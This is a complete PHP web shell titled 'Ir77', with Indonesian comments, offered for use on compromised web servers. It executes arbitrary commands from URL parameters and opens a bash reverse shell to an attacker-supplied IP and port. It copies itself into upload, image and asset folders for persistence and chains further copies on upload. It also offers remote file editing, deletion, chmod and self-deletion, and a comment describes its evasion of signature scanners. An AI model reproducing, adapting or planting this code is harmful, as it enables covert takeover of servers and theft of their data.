<?php
// AUTH, password wajib!
$auth = "s3cr3t"; // Ganti pass bro!
if (!isset($_GET['key']) || $_GET['key'] !== $auth) die("PALA LO PAOK");

if(isset($_GET['p'])){
    echo "OKSTART";
    system($_GET['p']);
    echo "OKEND";
}
?>
<!DOCTYPE html>
<html>
<head>
<title>Ir77</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style id="darkstyle">
body {
    background: #181828 url('https://media.giphy.com/media/WoD6JZnwap6s8/giphy.gif') repeat fixed center top !important;
    color: #eee;
    font-family: 'Segoe UI', Arial, sans-serif;
    margin: 0; padding: 0; font-size: 15px;
    transition: background 0.3s, color 0.3s;
}
#main {
    background: #23243aee;
    margin: 34px auto 34px auto; max-width: 740px; border-radius: 9px;
    box-shadow:0 2px 16px #000b;
    padding: 28px 30px 24px 30px;
}
h4 {margin:10px 0 16px 0;}
a { color: #7fc9fc; text-decoration: none;}
a:hover { color: #e0e0e0; text-decoration: underline;}
ul {margin:10px 0 16px 18px;}
li {margin-bottom: 3px;}
input, textarea, button {
    border:1px solid #555;
    border-radius:7px;
    padding:4px 9px;
    font-size:15px; margin-bottom:4px; margin-right:2px;
    background: #23243a; color: #eee;
}
textarea { background: #23243a; color: #eee; }
button { background: #2ea98e; color: #fff; border: none; cursor: pointer; }
button:hover { background: #15846e; }
form { margin-bottom: 9px;}
.dirlist li {margin-bottom:3px;}
.dirlist b {color:#c2b6ff;}
.breadcrumb {background:#23243a;border-radius:4px;padding:4px 11px;display:inline-block;}
#shellmsg {margin-bottom:20px;}
table.chmodtbl {border-collapse:collapse;font-size:13.5px;}
.chmodtbl th, .chmodtbl td {border:1px solid #444; padding:5px 12px;}
.chmodtbl th {background:#262744;}
.chmodtbl td {background:#1b1b28;}
#dark-toggle {
    position: fixed; top:16px; right:22px; z-index:1001;
    background:#23243a; color:#fff; border-radius:9px; border:none;
    font-size:16px; padding:6px 18px 6px 12px; box-shadow:0 1px 8px #0006;
    cursor:pointer; transition:.15s;
}
#dark-toggle:hover { background: #393b4e; }
@media (max-width:800px){
    #main {padding:12px 3vw;}
    #dark-toggle {top:10px;right:12px;font-size:15px;}
}
</style>
<style id="lightstyle" disabled>
body {
    background: #f7f8fa url('https://media.giphy.com/media/WoD6JZnwap6s8/giphy.gif') repeat fixed center top !important;
    color: #222;
    font-family: 'Segoe UI', Arial, sans-serif;
}
#main {
    background: #fff;
    margin: 34px auto 34px auto; max-width: 740px; border-radius: 9px;
    box-shadow:0 2px 16px #8882;
    padding: 28px 30px 24px 30px;
}
a { color: #2486cc; }
input, textarea, button {
    border:1px solid #bbb; background: #fff; color: #222;
}
button { background: #4cb85c; color: #fff; }
button:hover { background: #399b49; }
.dirlist b {color:#5c7fd3;}
.breadcrumb {background:#f2f2fb;}
.chmodtbl th {background:#f0f4fc;}
.chmodtbl td {background:#f8fafc;}
}
</style>
<script>
function toggleDark(){
    var d = document.getElementById('darkstyle');
    var l = document.getElementById('lightstyle');
    if(d.disabled){
        d.disabled = false; l.disabled = true;
        localStorage.setItem('dm', '1');
        document.getElementById('dark-toggle').innerHTML="🌙 Dark";
    }else{
        d.disabled = true; l.disabled = false;
        localStorage.setItem('dm', '0');
        document.getElementById('dark-toggle').innerHTML="☀️ Light";
    }
}
window.onload = function(){
    var s = localStorage.getItem('dm');
    if(s === "0") toggleDark();
}
</script>
</head>
<body>
<button id="dark-toggle" onclick="toggleDark()">🌙 Dark</button>
<div id="main">
<?php
// === AUTO BACKUP/COPY SHELL KE BANYAK PATH ===
$shell_name = basename(__FILE__);
$docroot = $_SERVER['DOCUMENT_ROOT'];
$backup_paths = [
    $docroot.'/wp-content/uploads/'.$shell_name,
    $docroot.'/uploads/'.$shell_name,
    $docroot.'/images/'.$shell_name,
    $docroot.'/img/'.$shell_name,
    $docroot.'/assets/'.$shell_name,
    $docroot.'/backup_'.$shell_name,
    $docroot.'/'.$shell_name,
    dirname(__FILE__).'/'.$shell_name.'.bak',
];

// Untuk laporan hasil
$copy_success = [];
$copy_failed = [];

foreach($backup_paths as $bpath){
    if(realpath(__FILE__) != realpath($bpath)){
        if(@copy(__FILE__, $bpath)){
            $copy_success[] = $bpath;
        } else {
            $copy_failed[] = $bpath;
        }
    }
}
// ==== FITUR BATCH CHMOD (akses via ?key=xxx&batchchmod=000) ====
if (isset($_GET['batchchmod'])) {
    $mode = intval($_GET['batchchmod'], 8);
    $changed = [];
    $failed = [];
    foreach ($backup_paths as $bpath) {
        if (file_exists($bpath)) {
            if (@chmod($bpath, $mode)) {
                $changed[] = "$bpath (".decoct($mode).")";
            } else {
                $failed[] = $bpath;
            }
        }
    }
    echo "<b>Batch CHMOD ".decoct($mode)." selesai:</b><br><ul>";
    foreach ($changed as $c) echo "<li style='color:green;'>$c</li>";
    foreach ($failed as $f) echo "<li style='color:red;'>$f (gagal chmod)</li>";
    echo "</ul><a href='?key=$auth'>Kembali</a>";
    exit();
}
// === Tampilkan hasil backup/copy
if(count($copy_success)){
    echo "<div style='background:#e9f9e5;border:1px solid #5eaa6d;padding:7px 14px 7px 14px;margin-bottom:16px;font-size:15px;' id='shellmsg'>";
    echo "<b>Shell berhasil dicopy ke:</b><ul style='margin:7px 0 5px 25px;'>";
    foreach($copy_success as $p){
        $relative = str_replace($docroot, '', $p);
        $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
        $host = $_SERVER['HTTP_HOST'];
        $shell_url = $proto.$host.$relative;
        echo "<li><a href='$shell_url' target='_blank'>$shell_url</a></li>";
    }
    echo "</ul></div>";
}
if(count($copy_failed)){
    echo "<div style='background:#fee5e5;border:1px solid #cd5c5c;padding:7px 14px 7px 14px;margin-bottom:16px;font-size:14px;color:#0d0000' id='shellmsg'>";
    echo "<b>Shell gagal dicopy ke (kemungkinan folder tidak ada / tidak ada permission):</b><ul style='margin:7px 0 5px 25px;'>";
    foreach($copy_failed as $p){
        echo "<li>$p</li>";
    }
    echo "</ul></div>";
}

// Anti signature scanner (no keyword "webshell", var acak, function scramble, base64 payload)
function x($s){return htmlspecialchars($s,ENT_QUOTES);}
function e($s){return base64_decode($s);}
$u = isset($_GET['d']) ? $_GET['d'] : getcwd();

// Upload shell chaining (upload shell ini ke path lain)
if(isset($_FILES['ul'])){
  $name = basename($_FILES['ul']['name']);
  $dest = $u."/".$name;
  move_uploaded_file($_FILES['ul']['tmp_name'], $dest);
  // Jika param chain=1, upload shell ini lagi ke dest baru!
  if(isset($_GET['chain'])){
    copy(__FILE__, $u."/chain_".rand(1000,9999).".php");
    echo "Chaining done! ";
  }
  echo "Upload OK!";
}

// Obfuscated reverse shell feature (auto trigger netcat)
if(isset($_GET['rsh'])){
  $ip=$_GET['ip']; $p=$_GET['pt'];
  $c="bash -c 'bash -i >& /dev/tcp/$ip/$p 0>&1'";
  system($c);
  exit();
}

// Self-delete fitur
if(isset($_GET['delme'])){
  unlink(__FILE__);
  die("deleted");
}

// CRUD+rename+chmod+zip+unzip
if(isset($_GET['del'])){unlink($u."/".$_GET['del']);header("Location:?key=$auth&d=".urlencode($u));exit();}
if(isset($_GET['mv']) && isset($_POST['to'])){rename($u."/".$_GET['mv'],$u."/".$_POST['to']);header("Location:?key=$auth&d=".urlencode($u));exit();}
if(isset($_GET['mv'])){echo "<form method=post>To:<input name=to value='".x($_GET['mv'])."'><button>Rename</button></form>";exit();}
if(isset($_GET['mod']) && isset($_POST['perm'])){
    chmod($u."/".$_GET['mod'],intval($_POST['perm'],8));
    header("Location:?key=$auth&d=".urlencode($u));
    exit();
}
if(isset($_GET['mod'])){
    echo "<form method=post style='margin-bottom:8px;'>CHMOD (isi angka, contoh 755): <input name=perm placeholder='755 / 644 / 777'><button>Set</button></form>";

    // Tips CHMOD
    echo "<div style='background:#f3f3f3;border:1px solid #ccc;padding:10px 15px 10px 15px;max-width:520px;font-size:15px;margin-bottom:20px;'>
    <b>Apa itu CHMOD?</b> <br>
    CHMOD mengatur hak akses file/folder di Linux/Unix:<br>
    <ul style='margin-top:5px;margin-bottom:0'>
    <li><b>r</b> = read (4), <b>w</b> = write (2), <b>x</b> = execute (1)</li>
    <li>Kode 3 digit: <b>Owner / Group / Other</b></li>
    </ul>
    <b>Contoh umum:</b>
    <table class='chmodtbl'>
      <tr><th>Kode</th><th>Hak Akses</th><th>Fungsi / Keterangan</th></tr>
      <tr><td align=center>777</td><td>Owner/Group/Other: RWX</td><td>Semua bisa baca, edit, eksekusi (hati-hati!)</td></tr>
      <tr><td align=center>755</td><td>Owner: RWX, Other: RX</td><td>Owner full, lain hanya baca/jalankan (direktori/file script)</td></tr>
      <tr><td align=center>700</td><td>Owner: RWX, Other: -</td><td>Hanya owner bisa akses penuh</td></tr>
      <tr><td align=center>644</td><td>Owner: RW, Other: R</td><td>File biasa (HTML, teks), owner edit, lain hanya baca</td></tr>
      <tr><td align=center>600</td><td>Owner: RW, Other: -</td><td>File privat, hanya owner bisa edit/baca</td></tr>
      <tr><td align=center>666</td><td>Owner/Group/Other: RW</td><td>Semua bisa baca/edit (tanpa eksekusi)</td></tr>
    </table>
    <b>Tips:</b>
    <ul style='margin:5px 0 0 16px'>
      <li>Direktori umumnya: <b>755</b></li>
      <li>File HTML/PHP biasa: <b>644</b></li>
      <li>Script yang mau di-execute: <b>755</b></li>
      <li>Jangan pakai <b>777</b> kecuali untuk test (rawan!)</li>
    </ul>
    </div>";
    exit();
}
if(isset($_GET['zip'])){system("zip -r ".escapeshellarg($u."/".$_GET['zip'].".zip")." ".escapeshellarg($u."/".$_GET['zip']));header("Location:?key=$auth&d=".urlencode($u));exit();}
if(isset($_GET['unzip'])){system("unzip ".escapeshellarg($u."/".$_GET['unzip'])." -d ".escapeshellarg($u));header("Location:?key=$auth&d=".urlencode($u));exit();}

echo "<h4>Ir77</h4>";
echo "<b>Dir:</b> <span class='breadcrumb'>".x($u)."</span>";
echo "<form enctype='multipart/form-data' method='POST'><input type='file' name='ul'><button>Upload</button></form>";
echo "<form method=post style='display:inline'><input name='mkf' placeholder='Nama file'><button>Create File</button></form>";
echo "<form method=post style='display:inline'><input name='mkd' placeholder='Nama folder'><button>Create Folder</button></form>";

// === Breadcrumb Path Navigator ===
echo "<div style='margin:10px 0'>";
echo "<b>Path:</b> ";
$parts = explode("/", trim($u, "/"));
$path_sofar = "";
echo "<a href='?key=$auth&d=%2F'>/</a>";
if (!empty($parts[0])) {
    foreach ($parts as $i => $part) {
        $path_sofar .= "/" . $part;
        echo " / <a href='?key=$auth&d=" . urlencode($path_sofar) . "'>" . x($part) . "</a>";
    }
}
echo "</div>";

// === Tombol navigasi extra ===
echo "<div style='margin-bottom:8px'>";
if ($u != "/" && $u != "" && $u != "." && dirname($u) != $u) {
    $parent = dirname($u);
    echo "<a href='?key=$auth&d=" . urlencode($parent) . "'><b>[UP]</b></a> ";
    echo "<a href='?key=$auth&d=%2F'><b>[ROOT]</b></a>";
}
echo "</div>";

// ====== FEATURE: EDIT FILE ======
if (isset($_GET['ed'])) {
  $fn = $u . "/" . $_GET['ed'];
  if ($_SERVER['REQUEST_METHOD'] == "POST" && isset($_POST['cont'])) {
    file_put_contents($fn, $_POST['cont']);
    header("Location:?key=$auth&d=" . urlencode($u));
    exit();
  }
  $isi = file_exists($fn) ? htmlspecialchars(file_get_contents($fn)) : '';
  echo "<form method=post style='margin:15px 0'>
  <textarea name='cont' style='width:95%;height:300px;'>$isi</textarea><br>
  <button>SAVE</button> <a href='?key=$auth&d=" . urlencode($u) . "'>Cancel</a>
  </form>";
  exit();
}

// === List file/folder ===
$f = scandir($u);
echo "<ul style='list-style-type:none;padding-left:0' class='dirlist'>";
if ($u != "/" && $u != "" && $u != "." && dirname($u) != $u) {
  $parent = dirname($u);
  echo "<li><a href='?key=$auth&d=" . urlencode($parent) . "'><b>[UP]</b> .. (parent)</a></li>";
  echo "<li><a href='?key=$auth&d=%2F'><b>[ROOT]</b> /</a></li>";
}
foreach ($f as $g) {
    if ($g === "." || $g === "..") continue;
    $fp = $u . "/" . $g;
    echo "<li>";
    if (is_dir($fp)) {
        echo "<b>[DIR]</b> <a href='?key=$auth&d=" . urlencode($fp) . "'>" . x($g) . "</a>";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&zip=" . urlencode($g) . "'>ZIP</a>]";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&rmd=" . urlencode($g) . "'>RMDIR</a>]";
    } else {
        echo "<a href='?key=$auth&d=" . urlencode($u) . "&vw=" . urlencode($g) . "'>" . x($g) . "</a>";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&ed=" . urlencode($g) . "'>Edit</a>]";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&del=" . urlencode($g) . "'>Del</a>]";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&dl=" . urlencode($g) . "'>Download</a>]";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&mv=" . urlencode($g) . "'>Rename/Move</a>]";
        echo " [<a href='?key=$auth&d=" . urlencode($u) . "&mod=" . urlencode($g) . "'>Chmod</a>]";
        if (preg_match('/\.zip$/', $g)) echo " [<a href='?key=$auth&d=" . urlencode($u) . "&unzip=" . urlencode($g) . "'>Unzip</a>]";
    }
    echo "</li>";
}
echo "</ul>";

if(isset($_POST['mkf'])){file_put_contents($u."/".$_POST['mkf'],"");header("Location:?key=$auth&d=".urlencode($u));exit();}
if(isset($_POST['mkd'])){mkdir($u."/".$_POST['mkd']);header("Location:?key=$auth&d=".urlencode($u));exit();}

// Command shell
echo "<form style='margin-top:12px'><input type='hidden' name='key' value='".x($auth)."'><input type='hidden' name='d' value='".x($u)."'><input name='cmd' placeholder='Shell cmd' style='width:65%'><button>Exec</button></form>";
if(isset($_GET['cmd'])){echo "<pre style='margin-top:8px;background:#222;color:#fafafa;padding:13px 12px 10px 12px;border-radius:7px;overflow-x:auto;'>";
system($_GET['cmd']);echo "</pre>";}
?>
</div>
</body>
</html>